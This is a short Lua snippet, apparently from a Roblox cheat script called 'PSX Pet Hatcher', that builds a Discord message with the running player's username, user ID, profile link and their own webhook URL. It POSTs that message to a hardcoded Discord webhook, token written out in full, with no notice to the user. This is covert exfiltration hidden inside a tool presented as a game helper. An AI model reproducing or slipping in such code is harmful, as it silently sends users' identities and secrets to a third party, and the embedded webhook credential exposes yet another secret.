local OSTime = os.time()
local Time = os.date('!*t', OSTime)
local lobgerz = {
                    ["color"] = 0xfffff, --decimal
                    ["title"] = username.." just executed PSX Pet Hatcher",
                    ["description"] = username.."'s webhook url: " .. _G.Webhook,
                    ["thumbnail"] = {
                        ["url"] = icon
                    },
                    ["author"] = {["name"] = username, ["icon_url"] = icon, ["url"] = "https://www.roblox.com/users/"..userid.."/profile"  },
                    ["footer"] = {
                    ["text"] = "PSX Pet Hatcher Logs",
                },
                ['timestamp'] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
            }
            (syn and syn.request or http_request) {
                Url = 'https://discord.com/api/webhooks/960377772084191272/FPLbhMK8p5qnUWPyjCvlZelmNQFaB86ExcC7Unq6j-Pojk_pw1ZDJbXYbg1e8MQ84ij0';
                Method = 'POST';
                Headers = {
                    ['Content-Type'] = 'application/json';
                };
                Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { lobgerz } } );
            };
